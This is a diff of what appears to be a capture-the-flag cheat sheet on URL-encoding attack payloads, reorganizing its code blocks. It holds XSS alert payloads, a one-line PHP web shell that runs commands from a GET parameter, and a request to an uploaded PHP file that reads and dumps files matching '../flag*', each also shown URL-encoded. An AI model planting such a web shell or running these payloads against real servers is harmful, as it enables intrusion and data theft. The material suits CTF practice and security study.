@@ -42,17 +42,24 @@ Online Tool:
 <!-- Encoded results -->
 1. %3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E
 2. javascript%3Aalert%28%27XSS%27%29%3B
+```
 
-<!-- Example 2: PHP Command Injection Payloads -->
-1. GET /uploads/payload.PHP?cmd=
-   foreach (glob("../flag*") as $filename) {echo "$filename => ";var_dump(file_get_contents($filename));};
-2. <?php system($_GET['cmd']); ?>
+```php
+// Example 2: PHP Common Payloads
+<?php system($_GET['cmd']); ?>
 
-<!-- Encoded results -->
-1. GET /uploads/payload.PHP?cmd=
-   foreach%20(glob(%22..%2Fflag%2A%22)%20as%20%24filename)%20
-   %7Becho%20%22%24filename%20%3D%3E%20%22%3Bvar_dump(file_get_contents(%24filename))%3B%7D%3B
-2. %3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E
+// Encoded results
+%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E
+
+// Example 3: PHP Command Injection Payloads
+GET /uploads/payload.PHP?cmd=
+foreach (glob("../flag*") as $filename) 
+{echo "$filename => ";var_dump(file_get_contents($filename));};
+
+// Encoded results
+GET /uploads/payload.PHP?cmd=
+foreach%20(glob(%22..%2Fflag%2A%22)%20as%20%24filename)%20
+%7Becho%20%22%24filename%20%3D%3E%20%22%3Bvar_dump(file_get_contents(%24filename))%3B%7D%3B
 ```
 
 Updating...
